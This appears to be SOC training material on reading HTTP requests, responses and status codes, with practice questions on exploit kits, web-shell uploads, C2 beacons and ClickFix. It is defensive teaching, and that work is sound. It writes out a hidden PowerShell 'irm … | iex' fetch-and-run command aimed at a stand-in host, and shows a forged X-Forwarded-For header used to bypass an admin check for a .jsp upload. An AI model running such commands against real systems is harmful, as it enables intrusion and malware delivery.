Headers can be faked; a mechanical rhythm is hard to hide (sophisticated malware adds jitter, but a pattern remains) Mozila One l missing. Real browsers don't make typos MSIE 8.0 + Windows NT 6.1 IE8 on Windows 7 — doesn't match the fleet (Windows 11, Chrome/Edge) Base64 data= Decodes to host=admin-PC1&os=Win11&user=jsmith: a check-in reporting PC name, OS and user. The body says Win11 while the User-Agent says Windows 7 — it contradicts itself No Referer, no preceding GET Sent without ever showing a form = a program POST "sends" Data is going out, not coming in /gate.php A name often seen on botnet control panels update-check-service A subdomain dressed up as an update service; check the real owner domain's first-seen date, registration age and reputation

Common mistakes:

  • "It requests a PHP file, so it's suspicious" → .php is everywhere on legitimate sites. What's suspicious is the name gate.php, and this isn't a file request (GET) but a POST sending data.
  • "The domain is example.org, so it's suspicious" → example.org / example.com are reserved for documentation examples, so they're not evidence either way. In real life, check the real owner domain's reputation and age.
  • "The User-Agent only says Mozila/5.0" → read inside the brackets too. The typo, IE8 and Windows 7 are all there.
  • Missing the interval → look at the pattern, not one line.

Next steps: isolate the PC → find which program made the connection (EDR, or Sysmon Event ID 3: "Network connection", recording which executable connected to which IP and port — normally chrome.exe / msedge.exe; for a beacon, something like C:\Users\jsmith\AppData\Roaming\...\update.exe in an odd location) → look for other PCs talking to the same domain → block the domain. See the Compromised workstation playbook.

docs.title: Question 3
docs.text:
Our web server sits behind a load balancer (10.0.0.5) that appends the real client IP to XFF. The web server log shows:

client IP:        10.0.0.5
request:          PUT /admin/upload/report.jsp HTTP/1.1
X-Forwarded-For:  127.0.0.1, 203.0.113.77
response status:  201

(a) What is the real attacker IP, and why can't 127.0.0.1 be trusted? (b) Putting 201 and report.jsp together, what most likely happened, and what should you check next?

Answer and explanation

(a) The real IP is 203.0.113.77, appended last by our load balancer. 127.0.0.1 is a fake note the attacker wrote themselves.

(b) 201 = "Created", and .jsp is a file the Java web server executes → very likely a web-shell upload.

Easy to miss: the two attacks are chained. The path is /admin/upload/ — an admin-only area. Many apps restrict admin pages to "requests from the server itself (127.0.0.1) or internal", and a sloppy app trusts the left-most XFF value as the client IP.

Step 1: Fake X-Forwarded-For: 127.0.0.1   → bypass the admin-only check
Step 2: PUT /admin/upload/report.jsp      → upload a server-side script
Step 3: 201 Created                       → the file now exists on the server

Naming it report.jsp is camouflage too.

Check next:

  1. Whether report.jsp exists on disk — don't execute it; take a copy and preserve its contents and hash
  2. Later GETs/POSTs to /admin/upload/report.jsp in the web logs → if any, the shell was used
  3. Every request from 203.0.113.77, in time order
  4. On the host: the Java web server process (java.exe, tomcat*.exe) spawning cmd.exe / powershell.exe (4688, Sysmon 1); on Linux, java → sh / bash
  5. Prevent recurrence: disable unneeded PUT, make the app trust only the right-most value added by our load balancer, patch the web server (e.g. Tomcat CVE-2025-24813)

Decide on isolating or stopping the server per the incident response process, weighing evidence preservation against business impact. See the Web shell / server playbook.

docs.title: Judging Requests — Checklist, Exploit Kits, URLs inside URLs
Judging Requests — Checklist, Exploit Kits, URLs inside URLs
docs.text:
What this page covers

A field-by-field checklist for HTTP requests (Host, User-Agent/Server, path, content, and the hard-to-judge Cookie), strings that look random but are normal, dissecting an exploit-kit (Angler) request line by line and domain shadowing, unwrapping URLs hidden inside a Referer (Google Translate, link-protection services), and what changed by 2026 (ClickFix, translate.goog phishing). Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Correction] = fixes a commonly stated mistake, [Changed]/[Caution] = what changed recently and what is risky if done the old way. What each header means is on POST, Other Methods and Request Headers.

docs.title: Ten key points
docs.text:
1. Don't go on gut feel; ask the same questions in the same order: Host → User-Agent/Server → path → content.
  2. Three words for suspicious: long, random, needlessly encoded. Legitimate software has nothing to hide.
  3. The User-Agent question has three levels: known in the world → common in our network → right for that PC (check the asset inventory).
  4. Cookies are supposed to look random. Judge their shape (named pairs, or one unnamed Base64 blob?) rather than their content.
  5. Random is a reason to start investigating, not a verdict. Build hashes, signed cloud URLs and ad-tracking IDs are normal.
  6. A request can be malicious even if most headers are normal; one or two decisive fields are enough. Check every field.
  7. In a drive-by download the request comes from the victim's legitimate browser. A normal User-Agent doesn't mean safe.
  8. User-Agent judgements depend on the era and your own baseline (IE10 was normal in 2015, suspicious in 2026).
  9. "Old legitimate domain + never-seen random subdomain" → suspect domain shadowing or a hijacked registrar account.
  10. If a URL contains a URL, the inner one is the real destination. Unwrap it even when the outside is Google or Microsoft.

docs.title: A field-by-field checklist
docs.text: Why it matters. Newcomers to HTTP logs often get stuck at "something feels off but I can't say what". The fix is simple: ask set questions, field by field, in a fixed order — like airport security checking passport → boarding pass → bag → person every time. A fixed order means no field is skipped and you can explain your reasoning.

docs.title: ① Host — does the domain look safe?
docs.text:
Apply the DNS domain signals: read right to left for the real owner, age, reputation, randomness, TLD.

Host: www.microsoft.com                       ← known, old, reputable
Host: q8z3k1vt.shady-host.eu                  ← random-looking subdomain, unfamiliar domain
Host: microsoft-365-verify.support-desk.top   ← brand name in front, real owner support-desk.top
  • Line 1: normal
  • Line 2: the subdomain looks machine-generated, not named by a person
  • Line 3: brand name in front, but the real owner is support-desk.top; .top is cheap and frequently cited as heavily abused

docs.title: ② User-Agent (request) / Server (response) — is this the right software?
docs.text:
The request's User-Agent and the response's Server are both self-introductions of the programs at either end of the conversation, so they're checked together, in three levels:

Level Question Baseline 1 Do I recognise this software? The world 2 Is it common on our network? Our organisation 3 Do we run it, on the right OS and version? That PC (asset inventory)

Chrome/141 passes levels 1 and 2, but if the sender is a server without Chrome installed, it fails level 3. The same goes for Server: if a company web server that always answers Server: Microsoft-IIS/10.0 suddenly answers with something else, someone is in the middle or the server changed. Conversely, an external site saying Server: nginx proves nothing — attacker servers mostly run NGINX or Apache too.

docs.title: ③ Path — do folder/file names and parameters look suspicious?
docs.text:
/images/logo.png                                   ← normal
/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE  ← long random string
/office365/secure/login/verify-account.php         ← phishing-style words
/wp-content/uploads/2026/10/invoice.pdf.exe        ← double extension, executable in uploads
/api/data?d=aG9zdD1hZG1pbi1QQzE=                   ← Base64 in a parameter
  • Line 1: ordinary
  • Line 2: a long random string no person would write
  • Line 3: reassuring words (office365, secure, login, verify) piled up — a classic phishing path
  • Line 4: an executable with a double extension in an uploads folder (meant for pictures); with extensions hidden, Windows shows it as invoice.pdf
  • Line 5: Base64 in a parameter

docs.title: ④ Content — anything unusual, like unnecessary encoding?
docs.text: Three words: long, random, needlessly encoded. Legitimate software sends data that people and programs can read easily; it's the attacker who has something to hide.

docs.title: The hard one: Cookie
docs.text:
Cookies are meant to look long and random, so the rule above doesn't apply directly. Judge the shape instead:

Cookie: session_id=8f3a91c2e7b44d0e; cart=2; lang=en      ← normal: named pairs
Cookie: aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=  ← one unnamed Base64 blob

Normal cookies are usually name=value pairs joined by ;. A single unnamed Base64 blob, or a cookie that changes completely on every request to a never-seen domain, deserves a look — C2 frameworks (for example Cobalt Strike's default profile) put host details into cookies in exactly that shape.

docs.title: [Added] Things that look random but are normal
docs.text:
Once you learn the checklist, every random string starts to look evil — the biggest source of false positives in practice.

/static/js/main.3f9a2b7c.js                                      ← build hash in file name
/bucket/report.pdf?X-Amz-Signature=9c1e0b...&X-Amz-Expires=3600  ← cloud storage signed URL
/landing?gclid=Cj0KCQjw...&utm_source=google                     ← ad click tracking IDs
/watch?v=dQw4w9WgXcQ                                             ← video ID
Line What it is 1 A fingerprint (build hash) added to file names on every site build, so browsers don't reuse stale copies 2 A cloud-storage URL signed to be valid for one hour 3 Ad-click tracking IDs 4 A video ID

Never judge on a random string alone — combine it with domain reputation and age and the surrounding request flow.

docs.title: What an exploit kit is
docs.text:
A "browser-hacking vending machine". Just visiting a page lets it fingerprint the browser and plugins (back then Flash, Java, Silverlight and Internet Explorer itself), pick a matching exploit and install malware with no click (a drive-by download). Angler was the most notorious exploit kit of 2013–2016 and mainly spread ransomware.

1) User visits a legitimate but compromised site (or sees a malicious ad)
2) Hidden redirect/iframe sends the browser to the EK landing page
3) Landing page fingerprints the browser and plugins
4) Matching exploit is delivered (e.g. Flash, IE)
5) Payload (often ransomware) is downloaded and run
  1. A normal site is compromised, or a malicious ad is served
  2. A hidden redirect sends the browser to the exploit kit's landing page
  3. The landing page inspects the browser
  4. A matching exploit is delivered
  5. The final payload (often ransomware) is installed

docs.title: Reading the request line by line
docs.text:
A request in the shape commonly seen in Angler infection traffic (domains and paths replaced with examples). It's the request that moves on from the step-2 landing page.

GET /PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Accept-Encoding: gzip, deflate
Host: q8z3k1vt.shady-host.eu
Connection: Keep-Alive
Field Verdict Explanation Request line (path) Suspicious 50+ random characters. Exploit kits generated fresh paths to defeat URL blocklists Accept Normal "HTML preferred, but anything (*/*) is fine" — a typical IE value of the time Referer Suspicious The previous page is another path on the same suspicious domain = the landing page; evidence the landing page called the next stage Accept-Language Normal US English. Rarely security-relevant, but for an Australian organisation a value unlike the usual en-AU is a small hint User-Agent Normal (then) IE10 (MSIE 10.0, Trident/6.0) on Windows 7 (Windows NT 6.1) — a common, legitimate browser in 2015 Accept-Encoding Normal The response may be compressed with gzip/deflate. Carving a file from a capture by hand yields a compressed blob you must decompress (Wireshark's "Export Objects → HTTP" and similar tools usually do it for you) Host Suspicious Random subdomain + unfamiliar domain Connection Normal Performance header: reuse the same TCP connection

Rebuild the full URL: Host + path.

http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE

docs.title: Lessons from this request
docs.text:
1. Mostly normal headers can still be malicious. Only Host, path and Referer are off; everything else is perfectly normal. That's why every field gets checked.

2. A normal User-Agent doesn't mean safe. In a drive-by download, the sender isn't malware but the victim's legitimate browser. And the same string in 2026 would be an impossible, obsolete browser. User-Agent judgements depend on the era and your baseline.

3. Follow the Referer backwards. The Referer of the landing-page request (/38104p5h2c) will most likely show the compromised legitimate site the user originally visited. That's where the infection started, and other staff who visited it are at risk too.

docs.title: [Added] Domain shadowing
docs.text:
Angler was known for domain shadowing (widely reported by Cisco Talos in 2015): attackers phished the registrar accounts of legitimate domain owners and silently created thousands of random subdomains pointing at their own servers.

  • The parent domain is old, genuine and reputable → passes reputation checks
  • The subdomains keep changing → hard to blocklist

So "old legitimate domain + never-seen random subdomain" is still worth checking. Use DNS logs and passive DNS to see when the subdomain first appeared and whether the domain ever had subdomains like it.

docs.title: A visit via Google Translate
docs.text:
This request looks odd at first. The user is viewing a Hungarian university site, the previous page was Google Translate, and the site being viewed also appears inside that Translate URL.

GET /some/page.html HTTP/1.1
Host: www.example-egyetem.hu
Referer: http://translate.google.com/translate?hl=en&sl=hu&u=http://www.example-egyetem.hu/some/page.html&prev=search

Did Google Translate send the user here? Was it compromised? Apply URL anatomy to the Referer and the answer appears:

http://translate.google.com/translate   ← Google Translate's whole-page translation feature
?hl=en                                   ← translate INTO English
&sl=hu                                   ← source language: Hungarian
&u=http://www.example-egyetem.hu/...     ← the page to translate
&prev=search                             ← user came from a search result

What actually happened: the user pasted the Hungarian site into Google Translate's whole-page translation to read it in English. The Translate page opened and re-requested the original site's resources (images, scripts), so the Referer shows the Translate URL. No compromise, no odd redirect — just a roundabout chain of events.

docs.title: "URLs inside URLs" you see every day
docs.text:
Analysts must recognise when the inner URL, not the outer one, is the real destination.

https://www.google.com/url?q=https%3A%2F%2Fexample.org%2Fpage&sa=D
https://aus01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin&data=...
https://urldefense.com/v3/__https://evil.example/login__;!!...
Service Where the real destination is Google redirect (search results, Google Docs links) After q= (%3A = :, %2F = /) Microsoft 365 Safe Links (wraps email links, checks at click time) After url= Proofpoint URL Defense Between __ and __

During phishing investigations proxy logs are full of these. Don't wave them through because the outer domain is google, outlook or urldefense — unwrap the inner address.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

The field-by-field checklist and "long, random, needlessly encoded" remain the best basic habits. "Unwrap URLs inside URLs" matters even more now that link-protection services are everywhere.

[Changed]

  • The exploit-kit era is effectively over. Angler vanished abruptly in June 2016 (widely linked to the arrests of the Russian Lurk group), and with Flash's end of support (end of 2020), Internet Explorer's retirement (2022), auto-updating browsers and stronger sandboxes, "infected just by visiting" became very hard. Attackers switched from attacking the browser to fooling the person:
    • Fake updates and fake installers: "your browser needs updating" pop-ups on compromised sites (SocGholish-style), fake installers pushed via search ads and SEO poisoning
    • ClickFix (fake CAPTCHA / fake fix): surging since 2024. The page says "to prove you're human, press Win+R → Ctrl+V → Enter" after silently copying a malicious PowerShell command to the clipboard. The user runs it themselves — no browser exploit needed
    • Traffic distribution systems (TDS) and cloaking: checking whether the visitor is a security scanner or a real victim in the target country/device and showing the malicious page only to victims — descendants of the exploit-kit "gate"
  • So HTTP analysis increasingly means spotting "a non-browser program (PowerShell, mshta, curl) fetched something from the web" rather than "the browser requested an odd path". The User-Agent question is central again.
  • Long URLs in Referer are rarer. The default browser policy (strict-origin-when-cross-origin) sends only the origin, such as https://translate.google.com/, to other sites. Google Translate itself now serves translated pages from a dedicated proxy domain such as www-example-egyetem-hu.translate.goog. Rule: dots become hyphens, existing hyphens become double hyphens, then .translate.goog is appended.

[Caution] Wrong or risky if done the old way

  • Translation and link-protection services are also phishing wrappers. Several security vendors have reported phishing pages wrapped in *.translate.goog. With Google on the outside, filters and users relax. The same goes for Safe Links-wrapped links. Always unwrap and judge the real inner destination.
  • "Random = malicious" breeds false positives. Normal random strings (build hashes, signed cloud URLs, ad-tracking IDs) keep multiplying. Random is a reason to investigate, not a verdict.

docs.title: Practice questions
docs.text: Answer first, then expand the explanation.

docs.title: Question 1
docs.text:
A staff PC logged this request. Within the previous minute, the same PC visited captcha-verify-cdn.example in its browser.

GET /c/run.txt HTTP/1.1
Host: captcha-verify-cdn.example
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-AU) WindowsPowerShell/5.1.26100.2161

(a) Which program sent it? (b) Which checklist field fails most decisively, and why? (c) What attack is suspected, and what should you check on the host?

Answer and explanation

(a) Windows PowerShell 5.1. This is the default User-Agent of PowerShell's web cmdlets (Invoke-WebRequest, Invoke-RestMethod, aka iwr, irm). Windows NT 10.0 = Windows 10/11, en-AU = the PC's locale, 5.1.26100.2161 = PowerShell version (build 26100 is Windows 11 24H2). A locale matching the real PC also suggests genuine PowerShell ran on that PC, not a faked string.

(b) User-Agent. It fails "do we run this software for this purpose?" squarely: PowerShell on an ordinary office PC fetching files straight from an external site is rare. Two more clues stack up:

  • PowerShell contacted the very site the browser visited a minute earlier → a strong sign the web page got the user to run something
  • /c/run.txt — harmless-looking .txt, but a .txt fetched by PowerShell is usually the next-stage script. The domain name captcha-verify-cdn mimics a CAPTCHA check too

(c) ClickFix (fake CAPTCHA). When the user presses Win+R → Ctrl+V → Enter, a command the page silently copied runs, for example:

powershell -w hidden -c "irm https://captcha-verify-cdn.example/c/run.txt | iex"

-w hidden = hide the window, irm ... = fetch text from the URL (this request), | iex (Invoke-Expression) = run the fetched text as a command.

Check on the host:

  1. Sysmon Event ID 1 / Event 4688 — parent explorer.exe → child powershell.exe (Explorer launches Run-dialog commands). Look for irm, iwr, iex, -w hidden, -enc (Base64-encoded command) in the command line
  2. RunMRU registry — HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU remembers commands typed into the Run dialog, most recent first. The pasted command stays there — a signature ClickFix artefact
  3. PowerShell Script Block Logging (Event 4104) — Microsoft-Windows-PowerShell/Operational records the script actually executed, often in de-obfuscated form, showing best what run.txt did. Which is why attackers sometimes try to switch it off
  4. Sysmon Event ID 3 (network connection) / 11 (file create) — where else powershell.exe connected and what it dropped
  5. Proxy logs — the PC's subsequent requests in time order

Response: isolate the PC. ClickFix commonly delivers infostealers (e.g. Lumma), so assume saved passwords and login cookies are gone: reset passwords and revoke all sessions. A stolen cookie bypasses MFA (Cookie).

docs.title: Question 2
docs.text:
A proxy log shows requests to this Host:

Host: secure--login-micros0ft-com.translate.goog

(a) What is the real origin site Google Translate is wrapping? (b) Why would an attacker route victims through Google Translate, and what's suspicious about the origin domain itself?

Answer and explanation

(a) secure-login.micros0ft.com. Drop .translate.goog and reverse the rule — double hyphens first:

secure--login-micros0ft-com
secure[-]login-micros0ft-com   ← "--" back to "-" first
secure-login.micros0ft.com     ← then single "-" back to "."

(b) Why route through Google Translate:

  1. The outer domain belongs to Google → easier past email filters, URL reputation checks and users' eyes; the certificate is a genuine Google one
  2. The victim organisation's proxy logs only show translate.goog → miss the real destination unless you unwrap it
  3. Google's servers fetch the content from the origin → the phishing server sees Google's IPs, not the victims', so even if the attacker's server is examined the victims stay hidden

What's wrong with the origin domain: reading right to left, the real owner is micros0ft.com — digit 0 instead of the letter o, a typosquatting domain. secure-login in front is a reassuring subdomain.

SOC response: unwrap *.translate.goog Hosts to the origin and evaluate that; alert separately when brand names (microsoft, office, outlook, mygov, bank names) appear. Block the unwrapped origin domain, not translate.goog as a whole.

docs.title: Question 3
docs.text:
Split these four URLs into "looks random but probably normal" and "needs investigating", with reasons.

A: https://shop.example.com/assets/app.9f3c21ab.js
B: http://x7qk2m9vtl.old-bakery-shop.com.au/Hn3kQz8LmPwR4tYvB2cXe9sJ0aFgD6uK
C: https://my-bucket.s3.ap-southeast-2.amazonaws.com/q3-report.pdf?X-Amz-Expires=3600&X-Amz-Signature=4b1f9e...
D: https://news.example.org/article?id=812&utm_source=newsletter&fbclid=IwAR2x...
Answer and explanation

Probably normal: A, C, D. Investigate: B.

URL Verdict Reason A Normal A JS file served from the shop's own domain; 9f3c21ab is a build hash. The random part is short and sits between readable names (assets, app) C Probably normal (not automatically safe) X-Amz-Expires=3600 = valid one hour, X-Amz-Signature = AWS signature — a common legitimate structure. But anyone can open an S3 account, so attackers send these links too → if a phishing email delivers a file from a never-seen bucket, check the file itself ("reputation borrowing") D Normal utm_source = marketing tag, fbclid = Facebook click ID B Investigate See below

Why B is suspicious:

  1. http, not https — legitimate sites in 2026 are almost all HTTPS
  2. The parent looks like an old small-business (bakery) domain, yet a bakery has no reason to use a random subdomain like x7qk2m9vtl → "old legitimate domain + never-seen random subdomain" = domain shadowing shape or a hijacked registrar account
  3. A 32-character random path — the same shape as the Angler path

How to investigate: DNS logs / passive DNS for when the subdomain first appeared and whether the bakery domain ever had subdomains like it → follow the visiting PC's Referer backwards to see where it came from (another compromised site, an email, an ad) → what the PC fetched afterwards → other staff who visited the same address.

Common thread: unwrap the real identity rather than the surface — the real actor behind the User-Agent (Q1), the real destination inside the wrapper (Q2), context rather than randomness (Q3).

docs.title: Response Headers and Status Codes
docs.text:
What this page covers

The headers a server sends back (Server, Date, Content-Type, Content-Length, Last-Modified, Set-Cookie, plus the must-know Location and Content-Disposition), catching a server's lies with magic bytes, reading status codes (1xx–5xx) from a SOC point of view, "what if nothing follows a 407?", and dissecting an 8-byte response. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Correction] = fixes a commonly stated mistake, [Changed]/[Caution] = what changed recently and what is risky if done the old way. The request side is on POST, Other Methods and Request Headers and Judging Requests.

docs.title: Ten key points
docs.text:
1. The request tells you what was asked for; the response tells you what was actually received. Look at both.
  2. Content-Type is the server's claim. Verify the real content with magic bytes (e.g. MZ for executables) and Zeek's resp_mime_types.
  3. A mismatch between Content-Type and resp_mime_types is a strong signal.
  4. For size, trust bytes your sensor counted (Zeek response_body_len) over the Content-Length header.
  5. Location is where the client goes next; Content-Disposition is the file name actually saved on the user's PC.
  6. First digit of the status: 1 = hold on, 2 = success, 3 = go elsewhere, 4 = client's fault, 5 = server's fault.
  7. The key question: did a malicious request get a 200 (or 201/206)?
  8. Look for a 200 inside a 404 storm, 401 storms (password guessing), and a 500 right after odd input (a vulnerability signal).
  9. A program that gets a 407 and never authenticates, retrying on a fixed interval, doesn't know the proxy — often malware.
  10. Status codes are chosen by the server too. "It's a 404, so nothing happened" is a dangerous conclusion.

docs.title: Response headers
docs.text:
Why it matters. If request headers are the customer's notes on the order, response headers are the delivery slip the kitchen sticks on the box: who made it, when it was sent, what's inside, how big it is. Requests only show what was asked for; responses show what was actually received.

Headers either describe the response itself (Server, …) or the content in the box (Content-Type, Content-Length, Content-Encoding, …). The latter used to be called "entity headers"; since RFC 9110 (June 2022) the official terms are "representation" / "content" headers.

HTTP/1.1 200 OK
Server: Apache/2.4.62 (Ubuntu)
Date: Sun, 01 Nov 2026 08:55:12 GMT
Content-Type: application/pdf
Content-Length: 482113
Last-Modified: Fri, 30 Oct 2026 23:10:04 GMT
Set-Cookie: sessionid=a91f3c7e2b; Path=/; Secure; HttpOnly; SameSite=Lax

%PDF-1.7 ... (file bytes) ...

The first line is the status line: version (HTTP/1.1), status code (200) and a human-readable reason (OK). Headers follow; the content sits below the blank line.

docs.title: Server — the kitchen's name
docs.text:
The web server software and version that produced the response (here Apache 2.4.62 on Ubuntu).

  • Checking our own servers: a detailed version lets attackers pick matching vulnerabilities straight away, so operators usually hide it (Server: nginx).
  • Profiling external servers: like a User-Agent it's only a self-introduction and can say anything. Attacker servers mostly claim nginx or Apache too.

[Added] Habits over names. The same software always has the same header order, default error pages and TLS behaviour. Server fingerprinting (JARM, JA4S, JA4X, …) uses this to find C2 servers hiding on the internet — the server-side version of header-order fingerprints.

docs.title: Date — when it was sent
docs.text: When the server sent the response, always in GMT (= UTC). 08:55:12 GMT is 19:55:12 Sydney daylight time (+11 h). Useful for lining up timelines with your own logs, but an attacker's server can write anything, so treat it as a reference value.

docs.title: Content-Type — what's inside (the most important)
docs.text:
The server's statement of what kind of file is in the box, written as a MIME type (a scheme originally for labelling email attachments): type/subtype.

text/html                         ← web page
image/png                         ← PNG image
application/pdf                   ← PDF document
application/zip                   ← ZIP archive
application/x-dosexec             ← Windows executable (EXE/DLL)
application/x-msdownload          ← Windows executable (another common label)
application/octet-stream          ← "just bytes" — unknown/generic binary
application/vnd.openxmlformats-officedocument.wordprocessingml.document  ← .docx

Its big advantage is mass searching in a SIEM: with Content-Type in your proxy logs you can pull "every executable a company PC downloaded from outside last week" in one search.

But Content-Type is what the server claims. An attacker's server can send an executable labelled image/png.

[Added] Catching the lie: magic bytes. Most files start with a few signature bytes. Labels (Content-Type, extension) can be swapped; change the signature and the file breaks.

4D 5A           "MZ"      ← Windows executable (EXE, DLL)
25 50 44 46     "%PDF"    ← PDF
50 4B 03 04     "PK.."    ← ZIP (also .docx, .xlsx, .jar, .apk — they are ZIP inside)
89 50 4E 47     ".PNG"    ← PNG image
FF D8 FF                  ← JPEG image
D0 CF 11 E0               ← old Office file (.doc, .xls) and .msi

MZ is the initials of Mark Zbikowski, who designed the MS-DOS executable format. .docx, .xlsx and .jar are ZIP inside, so they also start with PK.

Zeek's resp_mime_types in http.log is determined from the content's magic bytes, not the server header. So a server Content-Type that disagrees with Zeek's resp_mime_types is a strong signal.

Content sniffing. Without a Content-Type, some browsers guess the type from the content — which can be abused to run a script hidden in a fake image. Modern servers send X-Content-Type-Options: nosniff: "don't guess, use what I said".

docs.title: Content-Length — how big
docs.text:
The body size in bytes. Use the response's Content-Length to find the largest downloads and the request's to find the largest uploads (an exfiltration clue).

[Added] Content-Length is often missing. If the server doesn't know the size in advance it uses Transfer-Encoding: chunked, and HTTP/2 and HTTP/3 often omit it. Bytes actually counted on the wire (Zeek response_body_len, request_body_len) are more trustworthy.

docs.title: Last-Modified — when it last changed
docs.text:
When the file on the server was last modified; its purpose is caching.

[Correction] The main mechanism is a conditional GET, not HEAD. The browser adds If-Modified-Since: (previous Last-Modified) to a GET, and if nothing changed the server replies 304 Not Modified with no body. Comparing an ETag fingerprint (If-None-Match) instead of a date is also common.

[Added] On a malicious file's response, Last-Modified hints at when the attacker uploaded or changed it. It can be forged, so it's a reference value.

docs.title: Set-Cookie — putting on the wristband
docs.text:
The server says "store this cookie and show it with every request"; it comes back in later Cookie: headers (Cookie).

Attribute Meaning Secure Only send over HTTPS HttpOnly Page scripts can't read it → harder to steal via XSS SameSite=Lax Don't attach it freely to requests started from other sites Path=/ Valid across the whole site

For analysts, the moment a server issues a fresh session cookie right after a successful login matters — it's exactly the Set-Cookie that AiTM phishing intercepts.

docs.title: [Added] Location and Content-Disposition
docs.text:
HTTP/1.1 302 Found
Location: https://cdn.example.net/files/update.zip

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="Invoice_2026-10.pdf.exe"
  • Location — "not here, go to this address". Sent with 3xx codes, it tells you where the client went next. Phishing and malvertising chain several redirects; follow the Locations to rebuild the path.
  • Content-Disposition: attachment; filename="..." — "don't display this, save it under this name". Even if the URL is /dl?id=8812, the real saved name is here — in this example a double-extension .pdf.exe. Decisive when asking "where did this file in Downloads come from?"

docs.title: Status codes
docs.text:
Why it matters. The status code is the kitchen's one-line verdict on the order. Analysts use it to tell whether something was actually retrieved, and if something went wrong, whether the client or the server caused it and what the issue was.

1xx  Informational   ← "hold on, keep going"
2xx  Success         ← "here you go"
3xx  Redirection     ← "not here, go over there"
4xx  Client error    ← "customer's fault"
5xx  Server error    ← "kitchen's fault"
Code Meaning How a SOC reads it 100 Continue "Keep sending the body" Reply to Expect: 100-continue before a big POST; rarely security-relevant 101 Switching Protocols "Let's change how we talk" Usually starts a WebSocket; what follows barely appears in normal HTTP logs — a possible C2 hiding place 200 OK Success A 200 on a malicious request means execution or download probably happened 201 Created Created something new External PUT + 201 = suspect web-shell upload 204 No Content Success, nothing to return Also used as a beacon's "no tasks" reply 206 Partial Content Sent part of it Resumed downloads; Windows BITS produces many, and attackers use BITS for quiet downloads → many 206s adding up to one executable 301 / 308 Moved permanently Typically http → https 302 / 307 Temporarily elsewhere The travel path. Phishing, malvertising and TDS chain them; follow Location 304 Not Modified Unchanged, use your copy Caching; usually normal 400 Bad Request Malformed request Real browsers don't make syntax errors → hand-crafted requests or attack tools 401 Unauthorized Log in first (not yet authenticated) A 401 storm from one source = password guessing / spraying 403 Forbidden We know who you are, but no Knocking on forbidden areas such as admin pages 404 Not Found Not here A 404 storm = a scanner; find the 200s in between 405 Method Not Allowed Method not accepted Traces of PUT/DELETE attempts 407 Proxy Auth Required Authenticate to the proxy first See "reading between the lines" below 421 Misdirected Request Can't serve that site on this connection SNI/Host mismatch (e.g. domain fronting attempts) 429 Too Many Requests Too many requests Automated attacks hitting a rate limit 500 Internal Server Error Server-side error A 500 straight after odd input (e.g. SQL injection) = the input broke server code = a vulnerability signal 502 / 504 Backend didn't answer Failures behind a proxy or load balancer 503 Service Unavailable Can't cope Overload/maintenance; suspect DoS

If 401 vs 403 is confusing: 401 is not showing your staff badge at the front door; 403 is showing it but heading for a floor you're not cleared for.

docs.title: Reading between the lines: nothing after a 407?
docs.text:
If the company proxy authenticates automatically with Windows credentials, a normal browser or any program using Windows' own networking stack (WinINet, WinHTTP) answers a 407 immediately and silently with Kerberos/NTLM and retries.

20:15:02.101  10.1.5.23  -        CONNECT login.microsoftonline.com:443  407
20:15:02.188  10.1.5.23  jsmith   CONNECT login.microsoftonline.com:443  200

The first request has no username and gets a 407; less than 0.1 s later the same request returns as jsmith and gets a 200. The user notices nothing.

20:15:00  10.1.5.40  -  CONNECT update-svc.example:443  407
20:16:00  10.1.5.40  -  CONNECT update-svc.example:443  407
20:17:00  10.1.5.40  -  CONNECT update-svc.example:443  407
20:18:00  10.1.5.40  -  CONNECT update-svc.example:443  407

It gets a 407, never tries to authenticate, and repeats exactly a minute later. This program doesn't know how to authenticate to the company proxy — typically malware carrying its own HTTP code. A one-minute interval makes it a beacon.

The failed traffic is the clue. The malware never reached its C2, yet it keeps announcing itself in the proxy log. And you can only see this is odd if you know your normal flow first (407 → authenticate within 0.1 s → 200). The baseline is where detection starts.

[Caution] Not every silent 407 is malware

Legitimate software that isn't proxy-aware (some updaters, developer tools, old programs) produces the same pattern. Confirm which program made the connection on the host (Sysmon Event ID 3) before concluding.

docs.title: Reading practice: an 8-byte web page
docs.text:
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 08 Feb 2021 14:21:07 GMT
Content-Type: text/html
Content-Length: 8
Connection: keep-alive

........
Field Explanation 200 OK Success; the server returned something Date Sent on Monday 8 February 2021; line it up with your proxy log to confirm it's the same event Content-Type: text/html Claims to be a web page; between malware and a malicious server it could be deliberately misleading Server: nginx No version. nginx shows its version by default (nginx/1.24.0), so the operator hid it (server_tokens off) — also a common legitimate hardening step Content-Length: 8 An 8-byte body

[Added] What an 8-byte web page suggests. The shortest HTML skeleton (<html></html>) is 13 bytes, so 8 bytes can't be a page meant for people. It's more likely a short signal for a program (OK, 0, noop, a short token). It could be legitimate (health checks, ad-tracking replies), but if the same PC gets it on a fixed interval, always the same size, it's the classic shape of a C2 beacon's "no tasks" reply. When one suddenly larger response appears, that's the moment real commands or extra malware arrived. In beacon analysis, response-size patterns matter as much as intervals.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

Reading response headers (especially Content-Type, Content-Length, Set-Cookie), the meaning of status codes, and "silence after a 407 = a program that doesn't know the proxy" all still hold. In authenticated-proxy environments it remains a useful detection idea.

[Changed]

  • HTTP/2 and HTTP/3 have no "OK". The reason phrase is gone; only the number travels (:status: 200). A tool showing "200 OK" is adding the text itself.
  • 421 Misdirected Request shows up in practice — what CDNs return when SNI and Host don't match, e.g. domain fronting attempts (Domain fronting).
  • Content-Length is less reliable. Chunked transfer, HTTP/2/3 and compression mean it's often absent or different from the real size.
